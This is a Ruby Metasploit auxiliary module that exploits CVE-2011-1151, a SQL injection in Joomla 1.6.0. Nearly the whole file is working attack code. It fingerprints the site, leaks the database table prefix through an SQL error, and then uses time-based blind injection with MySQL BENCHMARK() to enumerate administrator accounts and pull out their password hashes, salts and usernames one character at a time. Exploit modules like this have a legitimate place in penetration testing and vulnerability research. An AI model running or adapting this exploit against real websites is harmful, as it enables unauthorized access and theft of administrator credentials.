# Requirements
require 'msf/core'

# Class declaration
class Metasploit3 < Msf::Auxiliary

  # Includes
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient	

  # Initialize module
  def initialize(info = {})
  
    # Initialize information
    super(update_info(info,
      'Name'           => 'Joomla 1.6.0 // SQL Injection Exploit',
      'Description'    => %q{
      A vulnerability was discovered by Aung Khant that allows for exploitable SQL Injection attacks 
      against a Joomla 1.6.0 install. This exploit attempts to leverage the SQL Injection to extract
      admin credentials, and then store those credentials within the notes_db.
  
      The vulnerability is due to a validation issue in /components/com_content/models/category.php
      that erroneously uses the "string" type whenever filtering the user supplied input. This issue 
      was fixed by performing a whitelist check of the user supplied order data against the allowed 
      order types, and also escaping the input.

      NOTES:
      ------------------------------------------------
      * Do not set the BMCT option too high!
      * Do not set the BMCT option too low either ...
      * A delay of about three to five seconds is ideal
      * Increase BMRC if you have issues with reliability
      },
      'Author'         => 
        [ 
          # Exploit Only (Bug credit to Aung Khant)
          'James Bercegay <james[at]gulftech.org> ( http://www.gulftech.org/ )'
        ],
      'License'        =>  MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-1151' ],
          [ 'http://0x6a616d6573.blogspot.com/2011/04/joomla-160-sql-injection-analysis-and.html' ],
        ],
      'Privileged'     =>  false,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Mar 17 2011',
      'DefaultTarget'  => 0 ))

      register_options(
        [
          # Required
          OptString.new('JDIR', [true, 'Joomla directory', '/']),
        
          # The number of function iterations to run during the benchmark
          OptInt.new('BMCT', [true, 'The number of iterations performed by BENCHMARK()', 500000 ]),
          
          # This is the benchmark delay threshold (in seconds)
          OptInt.new('BMDF', [true, 'The difference, in seconds, of a delayed request vs a normal request', 3 ]),
                    
          # The number of benchmark tests to make during each data request.
          # This number may be increased for accuracy if you have problems.
          OptInt.new('BMRC', [true, 'The number of benchmark requests to perform per operation (Speed vs Accuracy)', 1 ]),
          
          # Optional
          OptBool.new(  'DBUG', [false, 'Verbose output? (Debug)' ,  nil ]),
          OptString.new('AGNT', [false, 'User Agent Info'         , 'Mozilla/5.0' ]),

          # Database prefix
          OptString.new('PREF', [false, 'Joomla atabase prefixt',  'jos_' ]),
          
          # Admin account extraction limit
          OptInt.new('ALIM', [false, 'The number of admin accounts to extract (default is all available accounts)', nil ]),
              
          # Specific admin user ID to target		
          OptInt.new('AUID', [false, 'Target a specific admin user id', nil ]),			
          
          # URI used to trigger the bug
          OptString.new('JURI', [false, 'URI to trigger bug', "index.php/extensions/components/" ]),
          
          # Query used to trigger bug
          OptString.new('JQRY', [false, 'URI to trigger bug', "filter_order_Dir=1&filter_order=" ]),

        ], self.class)
  end
  #################################################
  
  # Extract "Set-Cookie"
  def init_cookie(data, cstr = true)
  
    # Raw request? Or cookie data specifically?
    data = data.headers['Set-Cookie'] ? data.headers['Set-Cookie']: data

    # Beginning
    if ( data )
      
      # Break them apart
      data = data.split(', ')
      
      # Initialize
      ctmp = ''
      tmps = {}
      
      # Parse cookies
      data.each do | x |
      
        # Remove extra data
        x = x.split(';')[0]
      
        # Seperate cookie pairs
        if ( x =~ /([^;\s]+)=([^;\s]+)/im )
        
          # Key
          k = $1
          
          # Val
          v = $2
        
          # Valid cookie value?
          if ( v.length() > 0 )
          
            # Build cookie hash
            tmps[k] = v
            
            # Report cookie status
            print_status("Got Cookie: #{k} => #{v}");
          end
        end
      end
      
      # Build string data
      if ( cstr == true )
        
        # Loop
        tmps.each do |x,y| 
        
          # Cookie key/value
          ctmp << "#{x}=#{y};" 
        end
        
        # Assign
        tmps['cstr'] = ctmp
      end
      
      # Return
      return tmps
    else
      # Something may be wrong
      init_debug("No cookies within the given response")
    end
  end
  
    #################################################
  
  # Simple debugging output
  def init_debug(resp, exit = 0)
  
    # is DBUG set? Check it
    if ( datastore['DBUG'] )
    
      # Print debugging data
      print_status("######### DEBUG! ########")
      pp resp
      print_status("#########################")
    end
    
    # Continue execution
    if ( exit.to_i > 0 )
    
      # Exit
      exit(0)
    end
    
  end
  
  #################################################
  
  # Generic post wrapper
  def http_post(url, data, headers = {}, timeout = 15)
  
    # Protocol
    proto = datastore['SSL'] ? 'https': 'http' 
  
    # Determine request url
    url = url.length ? url: ''
    
    # Determine User-Agent
    headers['User-Agent'] = headers['User-Agent']  ? 
    headers['User-Agent'] : datastore['AGNT']
    
    # Determine Content-Type
    headers['Content-Type'] = headers['Content-Type'] ? 
    headers['Content-Type'] : "application/x-www-form-urlencoded"
    
    # Determine Content-Length
    headers['Content-Length'] = data.length
    
    # Determine Referer
    headers['Referer'] = headers['Referer']        ? 
    headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"

    # Delete all the null headers
    headers.each do | hkey, hval |
    
      # Null value
      if ( !hval )
      
        # Delete header key
        headers.delete(hkey)
      end
    end

    # Send request
    resp = send_request_raw(
    {
      'uri'     => datastore['JDIR'] + url,
      'method'  => 'POST',
      'data'    => data,
      'headers' => headers
    }, 
    timeout	)
        
    # Returned
    return resp
    
  end
  
  #################################################
  
  # Generic post multipart wrapper	
  def http_post_multipart(url, data, headers = {}, timeout = 15)
    
    # Boundary string
    bndr =  Rex::Text.rand_text_alphanumeric(8)
    
    # Protocol
    proto = datastore['SSL'] ? 'https': 'http' 
  
    # Determine request url
    url = url.length ? url: ''
    
    # Determine User-Agent
    headers['User-Agent'] = headers['User-Agent']  ? 
    headers['User-Agent'] : datastore['AGNT']
    
    # Determine Content-Type
    headers['Content-Type'] = headers['Content-Type'] ? 
    headers['Content-Type'] : "multipart/form-data; boundary=#{bndr}"
    
    # Determine Referer
    headers['Referer'] = headers['Referer']        ? 
    headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"

    # Delete all the null headers
    headers.each do | hkey, hval |
    
      # Null value
      if ( !hval )
      
        # Delete header key
        headers.delete(hkey)
      end
    end

    # Init
    temp = ''
    
    # Parse form values
    data.each do |name, value|
    
      # Hash means file data
      if ( value.is_a?(Hash) )

        # Validate form fields
        filename = value['filename'] ? value['filename']: init_debug("Filename value missing from #{name}", 1)
        contents = value['contents'] ? value['contents']: init_debug("Contents value missing from #{name}", 1)
        mimetype = value['mimetype'] ? value['mimetype']: init_debug("Mimetype value missing from #{name}", 1)
        encoding = value['encoding'] ? value['encoding']: "Binary"

        # Build multipart data
        temp << "--#{bndr}\r\n"
        temp << "Content-Disposition: form-data; name=\"#{name}\"; filename=\"#{filename}\"\r\n"
        temp << "Content-Type: #{mimetype}\r\n"
        temp << "Content-Transfer-Encoding: #{encoding}\r\n"
        temp << "\r\n"
        temp << "#{contents}\r\n"
        
      else
        # Build multipart data
        temp << "--#{bndr}\r\n"
        temp << "Content-Disposition: form-data; name=\"#{name}\";\r\n"
        temp << "\r\n"
        temp << "#{value}\r\n"
      end
    end
    
    # Complete the form data
    temp << "--#{bndr}--\r\n"
    
    # Assigned
    data = temp	
    
    # Determine Content-Length
    headers['Content-Length'] = data.length
    
    # Send request
    resp = send_request_raw(
    {
      'uri'     => datastore['JDIR'] + url,
      'method'  => 'POST',
      'data'    => data,
      'headers' => headers
    }, 
    timeout)
    
    # Returned
    return resp
    
  end
  
  #################################################
  
  # Generic get wrapper
  def http_get(url, headers = {}, timeout = 15)
  
    # Protocol
    proto = datastore['SSL'] ? 'https': 'http' 
  
    # Determine request url
    url = url.length ? url: ''
    
    # Determine User-Agent
    headers['User-Agent'] = headers['User-Agent']  ? 
    headers['User-Agent'] : datastore['AGNT']

    # Determine Referer
    headers['Referer'] = headers['Referer']        ? 
    headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"

    # Delete all the null headers
    headers.each do | hkey, hval |
    
      # Null value // Also, remove post specific data, due to a bug ...
      if ( !hval || hkey == "Content-Type" || hkey == "Content-Length" )
      
        # Delete header key
        headers.delete(hkey)
      end
    end
    
    # Send request
    resp = send_request_raw({
      'uri'     => datastore['JDIR'] + url,
      'headers' => headers,
      'method'  => 'GET',
    }, timeout)
    
    # Returned
    return resp
    
  end
    
  #################################################

  # Used to perform benchmark querys
  def sql_benchmark(test, table = nil, where = '1 LIMIT 1', tnum = nil )
  
    # Init
    wait = 0
    
    # Defaults
    table = table ? table: 'users'
    
    # SQL Injection string used to trigger the MySQL BECNHMARK() function
    sqli = Rex::Text.uri_encode("( SELECT IF(#{test}, BENCHMARK(#{datastore['BMCT']}, MD5(1)), 0) FROM #{datastore['PREF']}#{table} WHERE #{where} ),")
    
    # Number of tests to run. We run this
    # amount of tests and then look for a
    # median value that is greater than
    # the benchmark difference.
    tnum = tnum ? tnum: datastore['BMRC']
    
    # Run the tests
    tnum.to_i.times do | i |
    
      # Start time
      bmc1 = Time.now.to_i
      
      # Make the request
      init_debug(http_post(datastore['JURI'], "#{datastore['JQRY']}#{sqli}"))
    
      # End time
      bmc2 = Time.now.to_i
      
      # Total time
      wait += bmc2 - bmc1
    end

    # Return the results
    return ( wait.to_i / tnum.to_i )
    
  end
  
  #################################################
  
  def get_users_data(snum, slim, cset, sqlf, sqlw)

      # Start time
      tot1 = Time.now.to_i
      
      # Initialize
      reqc = 0
      retn = String.new
        
      # Extract salt
      for i in snum..slim
      
        # Offset position
        oset = ( i - snum ) + 1
  
        # Loop charset
        for cbit in cset
  
          # Test character
          cbit.each do | cchr |
  
            # Start time (overall)
            bmc1 = Time.now.to_i
  
            # Benchmark query
            bmcv = sql_benchmark("SUBSTRING(#{sqlf},#{i},1) LIKE BINARY CHAR(#{cchr.ord})", "users", sqlw, datastore['BMRC'])
  
            # Noticable delay? We must have a match! ;)
            if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
  
              # Verbose
              print_status(sprintf("Character %02s is %s", oset.to_s, cchr ))
  
              # Append chr
              retn << cchr
  
              # Exit loop
              break
            end 
  
            # Counter
            reqc += 1
  
          end # each	
        end # for
  
        # Host not vulnerable?
        if ( oset != retn.length )
          
          # Failure
          print_error("Unable to extract character ##{oset.to_s}. Extraction failed!")
          return nil
        end
      end # for
  
      # End time (total)
      tot2 = Time.now.to_i
  
      # Benchmark totals
      tot3 = tot2 - tot1
  
      # Verbose
      print_status("Found data: #{retn}")
      print_status("Operation required #{reqc.to_s} requests ( #{( tot3 / 60 ).to_s} minutes )")
      
      # Return
      return retn
  end
  
  #################################################
  
  def run

    # Numeric test string
    tstr = Time.now.to_i.to_s

    # MD5 test string
    tmd5 = Rex::Text.md5(tstr)

    #################################################
    # STEP 01 // Attempt to extract Joomla version
    #################################################

    # Verbose
    print_status("Attempting to determine Joomla version")

    # Banner grab request
    resp = http_get("index.php")

    # Extract Joomla version information
    if ( resp.body =~ /name="generator" content="Joomla! ([^\s]+)/ )

      # Version
      vers = $1.strip 

      # Version "parts"
      ver1, ver2, ver3 = vers.split(/\./)

      # Only if 1.6.0 aka 1.6
      if ( ver2.to_i != 6 || ver3 )

        # Exploit failed
        print_error("Only Joomla versions 1.6.0 and earlier are vulnerable")
        print_error("Proceed with extreme caution, as the exploit may fail")
        init_debug(resp)
      else

        # Verbose
        print_status("The target is running Joomla version : #{vers}")
      end
    else
    
      # Verbose
      print_error("Unable to determine Joomla version ...")
    end

    #################################################
    # STEP 02 // Trigger an SQL error in order to get
    # the database table prefix for future use.
    #################################################

    # Trigger an SQL error
    resp = http_post(datastore['JURI'], "#{datastore['JQRY']}#{tmd5}")

    # Attempt to extract the table prefix
    if ( resp.body =~ /ORDER BY \s*#{tmd5}/ && resp.body =~ /FROM ([^\s]*)content / )

      # Prefix
      datastore['PREF'] = $1

      # Verbose
      print_status("Host appears vulnerable!")
      print_status("Got database table prefix : #{datastore['PREF']}")
    end

    #################################################
    # STEP 03 // Calculate BENCHMARK() response times
    #################################################

    # Verbose
    print_status("Calculating target response times")
    print_status("Benchmarking #{datastore['BMRC']} normal requests")

    # Normal request median (globally accessible)
    datastore['BMC0'] = sql_benchmark("1=2")
    
    # Verbose		
    print_status("Normal request avg: #{datastore['BMC0'].to_s} seconds")
    print_status("Benchmarking #{datastore['BMRC']} delayed requests")

    # Delayed request median
    bmc1 = sql_benchmark("1=1")

    # Verbose
    print_status("Delayed request avg: #{bmc1.to_s} seconds")

    # Benchmark totals
    bmct = bmc1 - datastore['BMC0']

    # Delay too small. The host may not be
    # vulnerable. Try increasing the BMCT.
    if ( bmct.to_i < datastore['BMDF'].to_i )

      # Verbose
      print_error("Either your benchmark threshold is too small, or host is not vulnerable")
      print_error("To increase the benchmark threshold adjust the value of the BMDF option")
      print_error("To increase the expression iterator adjust the value of the BMCT option")
      return
    else
      # Host appears exploitable
      print_status("Request Difference: #{bmct.to_s} seconds")
    end
    
    atot = 0     # Total admins
    scnt = 0     # Step counter
    step = 10    # Step increment
    slim = 10000 # Step limit
    
    # 42 is the hard coded base uid within Joomla ... 
    # ... and the answer to the ultimate question! ;]
    snum = 42
    
    # No user supplied limit?
    if ( datastore['ALIM'].to_i == 0 && datastore['AUID'].to_i == 0 )
    
      # Verbose
      print_status("Calculating total number of administrators")
      
      # Check how many admin accounts are in the database
      for i in 0..slim do
  
        # Benchmark 
        bmcv = sql_benchmark("1", "user_usergroup_map", "group_id=8 LIMIT #{i.to_s},1", datastore['BMRC'])
  
        # If we do not have a delay, then we have reached the end ...
        if ( !( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) )
  
          # Range
          atot = i
          
          # Verbose
          print_status("Successfully confirmed #{atot.to_s} admin accounts")
  
          # Exit loop
          break
        end 
      end
    else

      # User supplied limit
      atot = datastore['AUID'] ? 1: datastore['ALIM']
    end
    
    #################################################
    # STEP 04 // Attempting to find a valid admin id
    #################################################			
    
    # Loops until limit
    while ( snum < slim && scnt < atot )
    
      # Specific admin user ID?
      if ( datastore['AUID'].to_i == 0 )

        # Verbose
        print_status("Attempting to find a valid admin ID")
        
        # Verbose
        print_status("Stepping from #{snum.to_s} to #{slim.to_s} by #{step.to_s}")
    
        # Here we attempt to find a valid admin user id by incrementally searching the table
        # "user_usergroup_map" for users belonging to the user group 8, which is, by default
        # the admin user group. First we step through 10 at a time until we pass up a usable
        # admin id, then we step back by #{step} and increment by one until we have a match.
        for i in snum.step(slim, step)
    
          # Benchmark 
          bmcv = sql_benchmark("#{i} > user_id", "user_usergroup_map", "group_id=8 LIMIT #{scnt.to_s},1", datastore['BMRC'])
    
          # Noticable delay? We must have a match! ;)
          if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
    
            # Range
            itmp = i
    
            # Exit loop
            break
          else
            
            # Out of time ..
            if ( i == slim )
            
              # Failure
              print_error("Unable to find a valid user id. Exploit failed!")
              return
            end
            
          end 
        end
    
        # Jump back by #{step} and increment by one
        for i in ( itmp - step ).upto(( itmp + step ))
    
          # Benchmark 
          bmcv = sql_benchmark("user_id = #{i}", "user_usergroup_map", "group_id=8 LIMIT #{scnt.to_s},1", datastore['BMRC'])
    
          # Noticable delay? We must have a match! ;)
          if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
    
            # UserID
            auid = i
    
            # Verbose
            print_status("Found a valid admin account uid : #{auid.to_s}")
            
            # Step Counter
            scnt += 1
    
            # Exit loop
            break
          else
            
            # Out of time ..
            if ( i == ( itmp + step ) )
            
              # Failure
              print_error("Unable to find a valid user id. Exploit failed!")
              return
            end
          end 
        end
      else
        
        # Specific admin id target
        auid = datastore['AUID']
        print_status("Targeting admin user id: #{auid.to_s}")
      end
      
      #################################################
      # These are the charsets used for the enumeration
      # operations and can be easily expanded if needed
      #################################################
  
      # Hash charset a-f0-9
      hdic = [ ('a'..'f'), ('0'..'9') ]
  
      # Salt charset a-zA-Z0-9
      sdic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ]
      
      # Username charset
      udic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ]
    
      #################################################
      # STEP 05 // Attempt to extract admin pass hash
      #################################################
  
      # Verbose
      print_status("Attempting to gather admin password hash")
      
      # Get pass hash
      if ( !( hash = get_users_data(
              1,                # Length Start
              32,               # Length Maximum
              hdic,             # Charset Array
              "password",       # SQL Field name
              "id=#{auid.to_s}" # SQL Where data
              ) ) )
              
        # Failure
        print_error("Unable to gather admin pass hash. Exploit failed!!")
        return
      end
      
      #################################################
      # STEP 06 // Attempt to extract admin pass salt
      #################################################
      
      # Verbose
      print_status("Attempting to gather admin password salt")
      
      # Get pass salt
      if ( !( salt = get_users_data(
              34,               # Length Start
              65,               # Length Maximum
              sdic,             # Charset Array
              "password",       # SQL Field name
              "id=#{auid.to_s}" # SQL Where data
              ) ) )
              
        # Failure
        print_error("Unable to gather admin pass salt. Exploit failed!!")
        return
      end


      #################################################
      # STEP 08 // Attempt to extract admin username
      #################################################
      
      # Verbose
      print_status("Attempting to determine target username length")
      
      # Hard limit is 150
      for i in 1.upto(150)
  
        # Benchmark 
        bmcv = sql_benchmark("LENGTH(username)=#{i.to_s}", "users", "id=#{auid.to_s}", datastore['BMRC'])
  
        # Noticable delay? We must have a match! ;)
        if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
  
          # Length
          ulen = i
          
          # Verbose
          print_status("The username is #{i.to_s} characters long")
  
          # Exit loop
          break
        end 
      end
  
      # Verbose
      print_status('Gathering admin username')
  
      # Get pass salt
      if ( !( user = get_users_data(
              1,                # Length Start
              ulen,             # Length Maximum
              udic,             # Charset Array
              "username",       # SQL Field name
              "id=#{auid.to_s}" # SQL Where data
              ) ) )
              
        # Failure
        print_error("Unable to gather admin user name. Exploit failed!!")
        return
      end
      
      # Verbose
      print_status("USER: #{user} (ID: #{auid.to_s})")
      print_status("HASH: #{hash}")
      print_status("SALT: #{salt}")
      print_status("Inserting credentials into the note database ...")
      
      # Note data
      ndat = {
      
          # Joomla directory
            "JDIR" => datastore['JDIR'],
          
          # Admin ID
          "AUID" => auid,
          
          # Admin User
          "USER" => user,
          
          # Admin Hash
          "HASH" => hash,
          
          # Admin Salt
          "SALT" => salt,
           }

      # Save results            
            report_note(
                      :host   => datastore['RHOST'],
                      :proto  => ( !datastore['SSL'] ) ? 'HTTP': 'HTTPS',
                      :port   => datastore['RPORT'],
                      :type   => "Joomla Admin Credentials",
                      :data   => ndat
           			   )
    end # while
  end
end